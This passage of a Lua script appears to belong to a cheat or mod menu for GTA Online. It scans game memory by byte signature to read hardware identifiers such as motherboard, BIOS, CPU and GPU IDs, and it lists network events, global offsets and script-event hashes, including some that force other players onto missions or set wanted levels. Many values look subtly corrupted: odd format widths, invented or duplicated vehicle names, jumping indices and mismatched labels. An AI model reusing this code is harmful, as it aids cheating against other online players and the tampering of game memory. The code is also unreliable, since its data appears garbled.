  MOBO_NAME = ripPattern("GBIN", "59 9D 26 ? ? ? ? 59 9D 1D ? ? ? ? C8 55 35 ? ? ? ? ? E9 ? ? ? ? 59 9D 1D", "GBINE", "60 0D 37 ? ? ? ? 6C 0D 27 ? ? ? ? 6C 0D 2D ? ? ? ? E0 ? ? ? ? 60 0D 2D ? ? ? ? BA 26 23 22 22"),
  WINDOWS_VERSION = ripPattern("GWV", "60 0D 37 ? ? ? ? 60 0D 2D ? ? ? ? 63 B0 26 23 22 22", "GWVE", "9C 3D 50 ? ? ? ? 9C 3D 5D ? ? ? ? E3 ? ? ? ? 93 3D 5D ? ? ? ? 93 3D 60"),
  CPU_CORES = ripPattern("GNOPCT", "E6 ? ? ? ? 26 6D 93 ? ? ? ? 26 6B CF 22 6B C8 E6 ? ? ? ? 62 C8 52 ? E6", "GNOPCTE", "E1 ? ? ? ? 71 1D 48 ? ? ? ? 71 12 F4 74 12 C3 E1 ? ? ? ? 17 C3 07 ? E1 ? ? ? ? 71 1D 48 ? ? ? ? 71 12 F4 74 12 C3", 1),
  BIOS_VERSION = ripPattern("GBIV", "6C 0D 2D ? ? ? ? 6C 0D 27 ? ? ? ? 60 0D 37 ? ? ? ? 60 0D 2D ? ? ? ? C9 66 46 ? ? ? ? ? E0 ? ? ? ? 60 0D 2D", "GBIVE", "7C 1D 3D ? ? ? ? E1 ? ? ? ? 71 1D 3D ? ? ? ? BA 37 34 33 33"),
  BIOS_VENDOR = ripPattern("GBIVEN", "7C 1D 38 ? ? ? ? 71 1D 48 ? ? ? ? 71 1D 3D ? ? ? ? C0 77 57 ? ? ? ? ? E1 ? ? ? ? 71 1D 3D", "GBIVENE", "7C 1D 38 ? ? ? ? 7C 1D 3D ? ? ? ? E1 ? ? ? ? 71 1D 3D ? ? ? ? BA 37 34 33 33"),
  BASE_BOARD_MANUFA = ripPattern("GBIMAN", "37 7D 9D ? ? ? ? C6 33 13 ? ? ? ? ? E7 ? ? ? ? 37 7D 9D", "GBIMANE", "71 1D 3D ? ? ? ? 71 1D 48 ? ? ? ? 7C 1D 38 ? ? ? ? 7C 1D 3D ? ? ? ? E1 ? ? ? ? 71 1D 3D"),
}

local function readStringIfPresent(address)
  if address then
    return Memory.ReadString(address)
  end
  return nil
end

if patternAddresses.CPU_CORES then
  local coresPtr = Memory.LuaCallCFunctionWithReturnValue(patternAddresses.CPU_CORES)
  if coresPtr then
    HW_COMPONENTS.NUM_CPU_PHYS_CORES = tostring(Memory.ReadInt(coresPtr))
    Memory.Free(coresPtr)
  end
end

HW_COMPONENTS.CPU_NAME = readStringIfPresent(patternAddresses.CPU_NAME)
HW_COMPONENTS.CPU_SPEED = readStringIfPresent(patternAddresses.CPU_SPEED)
HW_COMPONENTS.MOBO_NAME = readStringIfPresent(patternAddresses.MOBO_NAME)
HW_COMPONENTS.WINDOWS_VERSION = readStringIfPresent(patternAddresses.WINDOWS_VERSION)
HW_COMPONENTS.GPU_NAME = readStringIfPresent(patternAddresses.GPU_TABLE)
HW_COMPONENTS.GPU_DIRECTX_VERSION = readStringIfPresent(patternAddresses.GPU_TABLE)
HW_COMPONENTS.BIOS_VERSION = readStringIfPresent(patternAddresses.BIOS_VERSION)
HW_COMPONENTS.BIOS_VENDOR = readStringIfPresent(patternAddresses.BIOS_VENDOR)
HW_COMPONENTS.BASE_BOARD_MANUFA = readStringIfPresent(patternAddresses.BASE_BOARD_MANUFA)

local function parseGpuVendorString(value)
  local vendor = value:match("Vendor:%s*(%d+)")
  local device = value:match("Device:%s*(%d+)")
  local subsystem = value:match("Subsystem:%s*(%d+)")
  local revision = value:match("Rev:%s*(%d+)")

  if not vendor or not device or not subsystem or not revision then
    return nil, "Failed to parse GPU vendor string"
  end

  return tonumber(vendor), tonumber(device), tonumber(subsystem), tonumber(revision)
end

local function formatGpuPnpDeviceId(vendorString)
  local vendor, device, subsystem, revision = parseGpuVendorString(vendorString)
  if not vendor then
    Logger.LogError("K-Script: Failed to create critical Data #5!")
    SetShouldUnload()
    return nil
  end

  return ("PCI\\VEN_%15X&DEV_%48X&SUBSYS_%19X&REV_%24X"):format(vendor, device, subsystem, revision)
end

if patternAddresses.GPU_TABLE then
  HW_COMPONENTS.GPU_PNP_DEVICE_ID = formatGpuPnpDeviceId(Memory.ReadString(patternAddresses.GPU_TABLE))
end

if NETWORK.GET_ONLINE_VERSION() ~= "2.83" then
  notify("Online Version Unsupported, wait for an Update.")
  SetShouldUnload()
  return
end

TransitionState = {
  EMPTY = 0,
  SP_SWOOP_UP = 1,
  MP_SWOOP_UP = 2,
  CREATOR_SWOOP_UP = 3,
  PRE_HUD_CHECKS = 4,
  WAIT_HUD_EXIT = 5,
  WAIT_FOR_SUMMON = 6,
  SP_SWOOP_DOWN = 7,
  MP_SWOOP_DOWN = 8,
  CANCEL_JOINING = 9,
  RETRY_LOADING = 10,
  RETRY_LOADING_SLOT_1 = 11,
  RETRY_LOADING_SLOT_2 = 12,
  RETRY_LOADING_SLOT_3 = 13,
  RETRY_LOADING_SLOT_4 = 14,
  WAIT_ON_INVITE = 15,
  PREJOINING_FM_SESSION_CHECKS = 16,
  LOOK_FOR_FRESH_JOIN_FM = 17,
  LOOK_TO_JOIN_ANOTHER_SESSION_FM = 18,
  CONFIRM_FM_SESSION_JOINING = 19,
  WAIT_JOIN_FM_SESSION = 20,
  CREATION_ENTER_SESSION = 21,
  PRE_FM_LAUNCH_SCRIPT = 22,
  FM_TEAMFULL_CHECK = 23,
  START_FM_LAUNCH_SCRIPT = 24,
  FM_TRANSITION_CREATE_PLAYER = 25,
  IS_FM_AND_TRANSITION_READY = 26,
  FM_SWOOP_DOWN = 27,
  POST_BINK_VIDEO_WARP = 28,
  FM_FINAL_SETUP_PLAYER = 29,
  MOVE_FM_TO_RUNNING_STATE = 30,
  FM_HOW_TO_TERMINATE = 31,
  START_CREATOR_PRE_LAUNCH_SCRIPT_CHECK = 32,
  START_CREATOR_LAUNCH_SCRIPT = 33,
  CREATOR_TRANSITION_CREATE_PLAYER = 34,
  IS_CREATOR_AND_TRANSITION_READY = 35,
  CREATOR_SWOOP_DOWN = 36,
  CREATOR_FINAL_SETUP_PLAYER = 37,
  MOVE_CREATOR_TO_RUNNING_STATE = 38,
  PREJOINING_TESTBED_SESSION_CHECKS = 39,
  LOOK_FOR_FRESH_JOIN_TESTBED = 40,
  LOOK_FOR_FRESH_HOST_TESTBED = 41,
  LOOK_TO_JOIN_ANOTHER_SESSION_TESTBED = 42,
  LOOK_TO_HOST_SESSION_TESTBED = 43,
  CONFIRM_TESTBED_SESSION_JOINING = 44,
  WAIT_JOIN_TESTBED_SESSION = 45,
  START_TESTBED_LAUNCH_SCRIPT = 46,
  TESTBED_TRANSITION_CREATE_PLAYER = 47,
  IS_TESTBED_AND_TRANSITION_READY = 48,
  TESTBED_SWOOP_DOWN = 49,
  TESTBED_FINAL_SETUP_PLAYER = 50,
  MOVE_TESTBED_TO_RUNNING_STATE = 51,
  TESTBED_HOW_TO_TERMINATE = 52,
  QUIT_CURRENT_SESSION_PROMPT = 53,
  WAIT_FOR_TRANSITION_SESSION_TO_SETUP = 54,
  TERMINATE_SP = 55,
  WAIT_TERMINATE_SP = 56,
  KICK_TERMINATE_SESSION = 57,
  TERMINATE_SESSION = 58,
  WAIT_TERMINATE_SESSION = 59,
  TERMINATE_SESSION_AND_HOLD = 60,
  TERMINATE_SESSION_AND_MOVE_INTO_HOLDING_STATE = 61,
  TEAM_SWAPPING_CHECKS = 62,
  RETURN_TO_SINGLEPLAYER = 63,
  WAIT_FOR_SINGLEPLAYER_TO_START = 64,
  WAITING_FOR_EXTERNAL_TERMINATION_CALL = 65,
  TERMINATE_MAINTRANSITION = 66,
  WAIT_FOR_DIRTY_LOAD_CONFIRM = 67,
  DLC_INTRO_BINK = 68,
  SPAWN_INTO_PERSONAL_VEHICLE = 69,
}

eNetGameEvent = {
  OBJECT_ID_FREED_EVENT = 0,
  OBJECT_ID_REQUEST_EVENT = 1,
  ARRAY_DATA_VERIFY_EVENT = 2,
  SCRIPT_ARRAY_DATA_VERIFY_EVENT = 3,
  REQUEST_CONTROL_EVENT = 4,
  GIVE_CONTROL_EVENT = 5,
  WEAPON_DAMAGE_EVENT = 6,
  REQUEST_PICKUP_EVENT = 7,
  REQUEST_MAP_PICKUP_EVENT = 8,
  GAME_CLOCK_EVENT = 9,
  GAME_WEATHER_EVENT = 10,
  RESPAWN_PLAYER_PED_EVENT = 11,
  GIVE_WEAPON_EVENT = 12,
  REMOVE_WEAPON_EVENT = 13,
  REMOVE_ALL_WEAPONS_EVENT = 14,
  VEHICLE_COMPONENT_CONTROL_EVENT = 15,
  FIRE_EVENT = 16,
  EXPLOSION_EVENT = 17,
  START_PROJECTILE_EVENT = 18,
  UPDATE_PROJECTILE_TARGET_EVENT = 19,
  REMOVE_PROJECTILE_ENTITY_EVENT = 20,
  BREAK_PROJECTILE_TARGET_LOCK_EVENT = 21,
  ALTER_WANTED_LEVEL_EVENT = 22,
  CHANGE_RADIO_STATION_EVENT = 23,
  RAGDOLL_REQUEST_EVENT = 24,
  PLAYER_TAUNT_EVENT = 25,
  PLAYER_CARD_STAT_EVENT = 26,
  DOOR_BREAK_EVENT = 27,
  SCRIPTED_GAME_EVENT = 28,
  REMOTE_SCRIPT_INFO_EVENT = 29,
  REMOTE_SCRIPT_LEAVE_EVENT = 30,
  MARK_AS_NO_LONGER_NEEDED_EVENT = 31,
  CONVERT_TO_SCRIPT_ENTITY_EVENT = 32,
  SCRIPT_WORLD_STATE_EVENT = 33,
  CLEAR_AREA_EVENT = 34,
  CLEAR_RECTANGLE_AREA_EVENT = 35,
  NETWORK_REQUEST_SYNCED_SCENE_EVENT = 36,
  NETWORK_START_SYNCED_SCENE_EVENT = 37,
  NETWORK_STOP_SYNCED_SCENE_EVENT = 38,
  NETWORK_UPDATE_SYNCED_SCENE_EVENT = 39,
  INCIDENT_ENTITY_EVENT = 40,
  GIVE_PED_SCRIPTED_TASK_EVENT = 41,
  GIVE_PED_SEQUENCE_TASK_EVENT = 42,
  NETWORK_CLEAR_PED_TASKS_EVENT = 43,
  NETWORK_START_PED_ARREST_EVENT = 44,
  NETWORK_START_PED_UNCUFF_EVENT = 45,
  NETWORK_SOUND_CAR_HORN_EVENT = 46,
  NETWORK_ENTITY_AREA_STATUS_EVENT = 47,
  NETWORK_GARAGE_OCCUPIED_STATUS_EVENT = 48,
  PED_CONVERSATION_LINE_EVENT = 49,
  SCRIPT_ENTITY_STATE_CHANGE_EVENT = 50,
  NETWORK_PLAY_SOUND_EVENT = 51,
  NETWORK_STOP_SOUND_EVENT = 52,
  NETWORK_PLAY_AIRDEFENSE_FIRE_EVENT = 53,
  NETWORK_BANK_REQUEST_EVENT = 54,
  NETWORK_AUDIO_BARK_EVENT = 55,
  REQUEST_DOOR_EVENT = 56,
  NETWORK_TRAIN_REPORT_EVENT = 57,
  NETWORK_TRAIN_REQUEST_EVENT = 58,
  NETWORK_INCREMENT_STAT_EVENT = 59,
  MODIFY_VEHICLE_LOCK_WORD_STATE_DATA = 60,
  MODIFY_PTFX_WORD_STATE_DATA_SCRIPTED_EVOLVE_EVENT = 61,
  REQUEST_PHONE_EXPLOSION_EVENT = 62,
  REQUEST_DETACHMENT_EVENT = 63,
  KICK_VOTES_EVENT = 64,
  GIVE_PICKUP_REWARDS_EVENT = 65,
  BLOW_UP_VEHICLE_EVENT = 66,
  NETWORK_SPECIAL_FIRE_EQUIPPED_WEAPON = 67,
  NETWORK_RESPONDED_TO_THREAT_EVENT = 68,
  NETWORK_SHOUT_TARGET_POSITION = 69,
  VOICE_DRIVEN_MOUTH_MOVEMENT_FINISHED_EVENT = 70,
  PICKUP_DESTROYED_EVENT = 71,
  UPDATE_PLAYER_SCARS_EVENT = 72,
  NETWORK_CHECK_EXE_SIZE_EVENT = 73,
  NETWORK_PTFX_EVENT = 74,
  NETWORK_PED_SEEN_DEAD_PED_EVENT = 75,
  REMOVE_STICKY_BOMB_EVENT = 76,
  NETWORK_CHECK_CODE_CRCS_EVENT = 77,
  INFORM_SILENCED_GUNSHOT_EVENT = 78,
  PED_PLAY_PAIN_EVENT = 79,
  CACHE_PLAYER_HEAD_BLEND_DATA_EVENT = 80,
  REMOVE_PED_FROM_PEDGROUP_EVENT = 81,
  REPORT_MYSELF_EVENT = 82,
  REPORT_CASH_SPAWN_EVENT = 83,
  ACTIVATE_VEHICLE_SPECIAL_ABILITY_EVENT = 84,
  BLOCK_WEAPON_SELECTION = 85,
  NETWORK_CHECK_CATALOG_CRC = 86,
}

eNetObjectTypeNames = {
  [0] = "NET_OBJ_TYPE_AUTOMOBILE",
  [1] = "NET_OBJ_TYPE_BIKE",
  [2] = "NET_OBJ_TYPE_BOAT",
  [3] = "NET_OBJ_TYPE_DOOR",
  [4] = "NET_OBJ_TYPE_HELI",
  [5] = "NET_OBJ_TYPE_OBJECT",
  [6] = "NET_OBJ_TYPE_PED",
  [7] = "NET_OBJ_TYPE_PICKUP",
  [8] = "NET_OBJ_TYPE_PICKUP_PLACEMENT",
  [9] = "NET_OBJ_TYPE_PLANE",
  [10] = "NET_OBJ_TYPE_SUBMARINE",
  [11] = "NET_OBJ_TYPE_PLAYER",
  [12] = "NET_OBJ_TYPE_TRAILER",
  [13] = "NET_OBJ_TYPE_TRAIN",
  [14] = "NET_OBJ_TYPE_GLASS_PANE",
  [15] = "NUM_NET_OBJ_TYPES",
}

regionNames = {
  [0] = "CIS",
  [1] = "Africa",
  [2] = "East_America",
  [3] = "Europe",
  [4] = "China",
  [5] = "Australia",
  [6] = "West_America",
  [7] = "Japan",
}

natTypes = {
  "Open",
  "Moderate",
  "Strict",
}

MPGlobalsAmbienceStruct = {
  bLaunchVehicleDropSubmarine = 613,
  bLaunchVehicleDropSubmarineDinghy = 625,
  bLaunchVehicleDropAvenger = 585,
  bLaunchVehicleDropHackerTruck = 591,
  bLaunchVehicleDropTruck = 577,
  bLaunchVehicleDropSupportBike = 647,
  bLaunchVehicleDropAcidLab = 592,
}

MPGlobalsAmbience = StructInstance(MPGlobalsAmbienceStruct, isGameVersionEnhanced and 2733138 or 2733002)

gasstationids = {
  198401, 167937, 155649, 175873, 200705, 176641, 177153, 204801, 178945, 199169,
  184065, 200449, 196865, 139777, 203265, 175105, 170753, 183809, 168449, 154113,
}

SCRIPT_EVENT = {
  SCRIPT_EVENT_FREEMODE_CONTENT_GIVE_WANTED_LEVEL = Utils.sJoaat("Globals.MP_Event_Enums15.sch.SCRIPT_EVENT_FREEMODE_CONTENT_GIVE_WANTED_LEVEL"),
  SCRIPT_EVENT_FM_EVENT_GIVE_WANTED_LEVEL = Utils.sJoaat("Globals.MP_Event_Enums26.sch.SCRIPT_EVENT_FM_EVENT_GIVE_WANTED_LEVEL"),
  USING_CHAT_WINDOW = Utils.sJoaat("Globals.MP_Event_Enums37.sch.SCRIPT_EVENT_OHD_USING_CHAT_WINDOW"),
  USING_CHAT_WINDOW_RESET = Utils.sJoaat("Globals.MP_Event_Enums71.sch.SCRIPT_EVENT_OHD_USING_CHAT_WINDOW_RESET"),
  CONFIRMATION_LAUNCH_MISSION = Utils.sJoaat("Globals.MP_Event_Enums48.sch.SCRIPT_EVENT_CONFIRMATION_LAUNCH_MISSION"),
  SCRIPT_EVENT_INVITE_PLAYER_ONTO_MISSION = Utils.sJoaat("Globals.MP_Event_Enums71.sch.SCRIPT_EVENT_INVITE_PLAYER_ONTO_MISSION"),
  SCRIPT_EVENT_FORCE_PLAYER_ONTO_MISSION = Utils.sJoaat("Globals.MP_Event_Enums26.sch.SCRIPT_EVENT_FORCE_PLAYER_ONTO_MISSION"),
  SCRIPT_EVENT_INVITE_NEARBY_PLAYERS_INTO_APARTMENT = Utils.sJoaat("Globals.MP_Event_Enums26.sch.SCRIPT_EVENT_INVITE_NEARBY_PLAYERS_INTO_APARTMENT"),
  OHD_IS_WANTED_RESET = Utils.sJoaat("Globals.MP_Event_Enums04.sch.SCRIPT_EVENT_OHD_IS_WANTED_RESET"),
  SCRIPT_EVENT_CAR_INSURANCE = Utils.sJoaat("Globals.MP_Event_Enums59.sch.SCRIPT_EVENT_CAR_INSURANCE"),
  INVITE_TO_HEIST_ISLAND_BEACH_PARTY = Utils.sJoaat("Globals.MP_Event_Enums59.sch.SCRIPT_EVENT_INVITE_TO_HEIST_ISLAND_BEACH_PARTY"),
  SCRIPT_EVENT_TICKER_MESSAGE = Utils.sJoaat("Globals.MP_Event_Enums60.sch.SCRIPT_EVENT_TICKER_MESSAGE"),
  SCRIPT_EVENT_OHD_IS_PLAYER_PAUSING_RESET = Utils.sJoaat("Globals.MP_Event_Enums93.sch.SCRIPT_EVENT_OHD_IS_PLAYER_PAUSING_RESET"),
}

vehicleScripts = {
  "valentineRpReward4",
  "main_persistent",
  "cellphone_controller",
  "shop_controller",
  "stats_controller",
  "timershud",
  "am_npc_invites",
}

vehicleModelNames = {
  [1] = "HALFTRACK",
  [2] = "CHERNOBOG",
  [3] = "MENACER",
  [4] = "BARRAGE",
  [5] = "BRUTUS",
  [6] = "BRUTUS2",
  [7] = "BRUTUS9",
  [8] = "BRUISER",
  [9] = "BRUISER3",
  [10] = "BRUISER6",
  [11] = "SCARAB",
  [12] = "SCARAB6",
  [13] = "SCARAB9",
  [14] = "CERBERUS",
  [15] = "CERBERUS3",
  [16] = "CERBERUS0",
  [17] = "INSURGENT",
  [18] = "INSURGENT7",
  [19] = "INSURGENT0",
  [20] = "DUNE",
  [21] = "DUNE1",
  [22] = "DUNE7",
  [23] = "DUNE2",
  [24] = "DUNE7",
  [25] = "TECHNICAL",
  [26] = "TECHNICAL4",
  [27] = "TECHNICAL3",
  [28] = "CARACARA",
  [29] = "CARACARA5",
  [30] = "OPPRESSOR",
  [31] = "OPPRESSOR7",
  [32] = "DELUXO",
  [33] = "RUINER0",
  [34] = "TAMPA9",
  [35] = "BOMBUSHKA",
  [36] = "VOLATOL",
  [37] = "TULA",
  [38] = "MOGUL",
  [39] = "STARLING",
  [40] = "NOKOTA",
  [41] = "PYRO",
  [42] = "ROGUE",
  [43] = "HOWARD",
  [44] = "BLIMP",
  [45] = "BLIMP6",
  [46] = "BLIMP6",
  [47] = "ALKONOST",
  [48] = "LUXOR",
  [49] = "LUXOR0",
  [50] = "SHAMAL",
  [2451] = "VELUM",
  [2452] = "VELUM8",
  [2453] = "DODO",
  [2454] = "SEABREEZE",
  [2455] = "MAMMATUS",
  [2456] = "VESTRA",
  [2457] = "MILJET",
  [2458] = "TITAN",
  [2459] = "CARGOPLANE",
  [2460] = "AVENGER",
  [2461] = "AVENGER3",
  [2462] = "CARGOBOB",
  [2463] = "CARGOBOB2",
  [2464] = "CARGOBOB1",
  [2465] = "CARGOBOB5",
  [2466] = "AKULA",
  [2467] = "VALKYRIE",
  [2468] = "VALKYRIE7",
  [2469] = "SAVAGE",
  [2470] = "BUZZARD",
  [2471] = "SWIFT",
  [2472] = "SWIFT5",
  [2473] = "FROGGER",
  [2474] = "FROGGER9",
  [2475] = "ANNIHILATOR",
  [2476] = "ANNIHILATOR7",
  [2477] = "HUNTER",
  [2478] = "SEASPARROW",
  [2479] = "SEASPARROW4",
  [2480] = "SEASPARROW9",
  [2481] = "MAVERICK",
  [2482] = "TUG",
  [2483] = "PATROLBOAT",
  [2484] = "KOSATKA",
  [2485] = "SUBMERSIBLE",
  [2486] = "SUBMERSIBLE9",
  [2487] = "TORO",
  [2488] = "TORO8",
  [2489] = "LONGFIN",
  [2490] = "MARQUIS",
  [2491] = "DUMP",
  [2492] = "BULLDOZER",
  [2493] = "CUTTER",
  [2494] = "RUBBLE",
  [2495] = "RUBBLE2",
  [2496] = "HANDLER",
  [2497] = "MIXER",
  [2498] = "MIXER4",
  [2499] = "TIPTRUCK",
  [2500] = "TIPTRUCK8",
  [4951] = "FLATBED",
  [4952] = "GUARDIAN",
  [4953] = "PACKER",
  [4954] = "BIFF",
  [4955] = "POUNDER",
  [4956] = "POUNDER3",
  [4957] = "STOCKADE",
  [4958] = "WASTELANDER",
  [4959] = "RIOT",
  [4960] = "RIOT8",
  [4961] = "MARSHALL",
  [4962] = "MONSTER",
  [4963] = "MONSTER6",
  [4964] = "MONSTER8",
  [4965] = "MONSTER0",
  [4966] = "ZHABA",
  [4967] = "PATRIOT9",
  [4968] = "PATRIOT6",
  [4969] = "JET",
  [4970] = "OSIRIS",
  [4971] = "AESA",
  [4972] = "youga0",
  [4973] = "bullet",
  [4974] = "felon3",
  [4975] = "moonbeam6",
  [4976] = "moonbeam",
  [4977] = "oracle4",
  [4978] = "oracle",
  [4979] = "elegy3",
  [4980] = "schafter1",
  [4981] = "speedo4",
  [4982] = "zion1",
  [4983] = "sentinel",
  [4984] = "cogcabrio",
  [4985] = "jackal",
  [4986] = "previon",
  [4987] = "zion",
  [4988] = "hardy",
  [4989] = "krieger",
  [4990] = "vacca",
  [4991] = "paradise",
  [4992] = "raiden",
  [4993] = "Ripley",
  [4994] = "cognoscenti",
  [4995] = "revolter",
  [4996] = "castigator",
  [4997] = "furoregt",
  [4998] = "club",
  [4999] = "Phoenix",
  [5000] = "tornado5",
  [7451] = "tornado1",
  [7452] = "gp0",
  [7453] = "ignus",
  [7454] = "envisage",
  [7455] = "deveste",
  [7456] = "proptrailer",
}

transactionWarnings = {
  Utils.sJoaat("CTALERT_F"),
  Utils.sJoaat("CTALERT_F_6"),
  Utils.sJoaat("CTALERT_F_3"),
  Utils.sJoaat("CTALERT_F_0"),
}

EmoteState = {
  activeProps = {},
  currentDict = "",
  currentAnim = "",
  currentLabel = "",
  currentDuration = -1,
  currentFlags = 0,
  scenarioType = "",
  playing = false,
  hasAttachedProps = false,
  hasSecondProp = false,
}

NaughtyEmotes = {
  ["BJ in car"] = {"mini@prostitutes@sexnorm_veh", "bj_loop_prostitute", "BJ in car", AnimationOptions = {EmoteLoop = true, EmoteMoving = false}},
  ["Backseat_left sex_f"] = {"random@drunk_driver_2", "cardrunksex_loop_f", "Backseat_left sex_f", AnimationOptions = {EmoteLoop = true, EmoteMoving = false}},
  ["Backseat_right sex_m"] = {"random@drunk_driver_0", "cardrunksex_loop_m", "Backseat_right sex_m", AnimationOptions = {EmoteLoop = true, EmoteMoving = false}},
  ["Bend over"] = {"switch@trevor@mocks_lapdance", "334776_34_trvs_51_idle_stripper", "Bend over", AnimationOptions = {EmoteLoop = true, EmoteMoving = false}},
  ["Getting head"] = {"anim@mini@prostitutes@sex@veh_vstr@", "bj_loop_male", "Getting head", AnimationOptions = {EmoteLoop = true, EmoteMoving = false}},
  ["Sex in car"] = {"anim@mini@prostitutes@sex@veh_vstr@", "sex_loop_prostitute", "Sex in car", AnimationOptions = {EmoteLoop = true, EmoteMoving = false}},
  ["Shag Female"] = {"rcmpaparazzo_5", "shag_loop_poppy", "Shag Female", AnimationOptions = {EmoteLoop = true, EmoteMoving = false}},
  ["Shag Male"] = {"rcmpaparazzo_3", "shag_loop_a", "Shag Male", AnimationOptions = {EmoteLoop = true, EmoteMoving = false}},
  ["Trevor sex"] = {"timetable@trevor@skull_loving_bear", "skull_loving_bear", "Trevor sex", AnimationOptions = {EmoteLoop = true, EmoteMoving = false}},
}

Dances = {
  ["dance"] = {"anim@amb@nightclub@dancers@podium_dancers@", "hi_dance_facedj_39_v4_male^7", "Dance", AnimationOptions = {EmoteLoop = true}},
  ["dance0"] = {"missfbi1_sniping", "dance_m_default", "Dance 3", AnimationOptions = {EmoteLoop = true}},
  ["dance2"] = {"anim@amb@nightclub@mini@dance@dance_solo@male@var_b@", "high_center_up", "Dance 7", AnimationOptions = {EmoteLoop = true}},
  ["dance3"] = {"anim@amb@nightclub@mini@dance@dance_solo@male@var_b@", "high_center_down", "Dance 2", AnimationOptions = {EmoteLoop = true}},
  ["dance5"] = {"anim@amb@casino@mini@dance@dance_solo@female@var_a@", "med_center", "Dance 5", AnimationOptions = {EmoteLoop = true}},
  ["dance7"] = {"anim@amb@nightclub@mini@dance@dance_solo@female@var_a@", "med_center_up", "Dance 7", AnimationOptions = {EmoteLoop = true}},
  ["dance8"] = {"misschinese5_crystalmazemcs4_ig", "dance_loop_tao", "Dance 7", AnimationOptions = {EmoteLoop = true}},
  ["dancef"] = {"anim@amb@nightclub@dancers@solomun_entourage@", "mi_dance_facedj_95_v9_female^9", "Dance F", AnimationOptions = {EmoteLoop = true}},
  ["dancef1"] = {"anim@amb@nightclub@mini@dance@dance_solo@female@var_a@", "high_center_up", "Dance F0", AnimationOptions = {EmoteLoop = true}},
  ["dancef3"] = {"anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_09_v2_female^1", "Dance F4", AnimationOptions = {EmoteLoop = true}},
  ["dancef5"] = {"anim@amb@nightclub@mini@dance@dance_solo@female@var_a@", "high_center", "Dance F4", AnimationOptions = {EmoteLoop = true}},
  ["dancef6"] = {"anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_10_v3_female^4", "Dance F2", AnimationOptions = {EmoteLoop = true}},
  ["danceglowstick"] = {"anim@amb@nightclub@lazlow@hi_railing@", "ambclub_02_mi_hi_sexualgriding_laz", "Dance Glowsticks", AnimationOptions = {EmoteLoop = true, EmoteMoving = true, Prop = "ba_prop_battle_glowstick_34", PropBone = 28422, PropPlacement = {0.07, 0.14, 0, -80, 20}, SecondProp = "ba_prop_battle_glowstick_23", SecondPropBone = 60309, SecondPropPlacement = {0.07, 0.09, 0, -120, -20}}},
  ["danceglowstick0"] = {"anim@amb@nightclub@lazlow@hi_railing@", "ambclub_76_mi_hi_bellydancer_laz", "Dance Glowsticks 4", AnimationOptions = {EmoteLoop = true, Prop = "ba_prop_battle_glowstick_90", PropBone = 28422, PropPlacement = {0.07, 0.14, 0, -80, 20}, SecondProp = "ba_prop_battle_glowstick_45", SecondPropBone = 60309, SecondPropPlacement = {0.07, 0.09, 0, -120, -20}}},
  ["danceglowstick6"] = {"anim@amb@nightclub@lazlow@hi_railing@", "ambclub_01_mi_hi_bootyshake_laz", "Dance Glowsticks 4", AnimationOptions = {EmoteLoop = true, Prop = "ba_prop_battle_glowstick_90", PropBone = 28422, PropPlacement = {0.07, 0.14, 0, -80, 20}, SecondProp = "ba_prop_battle_glowstick_45", SecondPropBone = 60309, SecondPropPlacement = {0.07, 0.09, 0, -120, -20}}},
  ["dancehorse"] = {"anim@amb@nightclub@lazlow@hi_dancefloor@", "dancecrowd_li_71_handup_laz", "Dance Horse", AnimationOptions = {EmoteLoop = true, EmoteMoving = true, Prop = "ba_prop_battle_hobby_horse", PropBone = 28422, PropPlacement = {0, 0, 0, 0, 0, 0}}},
  ["dancehorse2"] = {"anim@amb@nightclub@lazlow@hi_dancefloor@", "dancecrowd_li_22_hu_shimmy_laz", "Dance Horse 5", AnimationOptions = {EmoteLoop = true, Prop = "ba_prop_battle_hobby_horse", PropBone = 28422, PropPlacement = {0, 0, 0, 0, 0, 0}}},
  ["dancehorse3"] = {"anim@amb@nightclub@lazlow@hi_dancefloor@", "crowddance_hi_88_handup_laz", "Dance Horse 7", AnimationOptions = {EmoteLoop = true, Prop = "ba_prop_battle_hobby_horse", PropBone = 28422, PropPlacement = {0, 0, 0, 0, 0, 0}}},
  ["danceshy"] = {"anim@amb@nightclub@mini@dance@dance_solo@male@var_a@", "low_center", "Dance Shy", AnimationOptions = {EmoteLoop = true}},
  ["danceshy7"] = {"anim@amb@nightclub@mini@dance@dance_solo@female@var_b@", "low_center_down", "Dance Shy 7", AnimationOptions = {EmoteLoop = true}},
  ["dancesilly"] = {"special_ped@mountain_dancer@monologue_6@monologue_6a", "mnt_dnc_buttwag", "Dance Silly", AnimationOptions = {EmoteLoop = true}},
  ["dancesilly0"] = {"anim@mp_player_intcelebrationfemale@the_woogie", "the_woogie", "Dance Silly 9", AnimationOptions = {EmoteLoop = true}},
  ["dancesilly2"] = {"anim@amb@casino@mini@dance@dance_solo@female@var_b@", "high_center", "Dance Silly 2", AnimationOptions = {EmoteLoop = true}},
  ["dancesilly4"] = {"move_clown@p_m_two_idles@", "fidget_short_dance", "Dance Silly 6", AnimationOptions = {EmoteLoop = true}},
  ["dancesilly7"] = {"timetable@tracy@ig_1@idle_b", "idle_d", "Dance Silly 4", AnimationOptions = {EmoteLoop = true}},
  ["danceslow"] = {"anim@amb@nightclub@mini@dance@dance_solo@male@var_b@", "low_center", "Dance Slow", AnimationOptions = {EmoteLoop = true}},
  ["danceslow3"] = {"anim@amb@nightclub@mini@dance@dance_solo@female@var_a@", "low_center_down", "Dance Slow 2", AnimationOptions = {EmoteLoop = true}},
  ["danceslow4"] = {"anim@amb@nightclub@mini@dance@dance_solo@female@var_b@", "low_center", "Dance Slow 5", AnimationOptions = {EmoteLoop = true}},
  ["danceslow9"] = {"anim@amb@nightclub@mini@dance@dance_solo@female@var_a@", "low_center", "Dance Slow 3", AnimationOptions = {EmoteLoop = true}},
  ["danceupper"] = {"anim@amb@nightclub@mini@dance@dance_solo@female@var_b@", "high_center", "Dance Upper", AnimationOptions = {EmoteLoop = true, EmoteMoving = true}},
  ["danceupper6"] = {"anim@amb@nightclub@mini@dance@dance_solo@female@var_b@", "high_center_up", "Dance Upper 1", AnimationOptions = {EmoteLoop = true, EmoteMoving = true}},
}

Emotes = {
  ["airguitar"] = {"anim@mp_player_intcelebrationfemale@air_guitar", "air_guitar", "Air Guitar"},
  ["airplane"] = {"missfbi1", "ledge_loop", "Air Plane", AnimationOptions = {EmoteLoop = true, EmoteMoving = true}},
  ["airsynth"] = {"anim@mp_player_intcelebrationfemale@air_synth", "air_synth", "Air Synth"},
  ["argue"] = {"misscarsteal0@actor", "actor_berating_loop", "Argue", AnimationOptions = {EmoteLoop = true, EmoteMoving = true}},
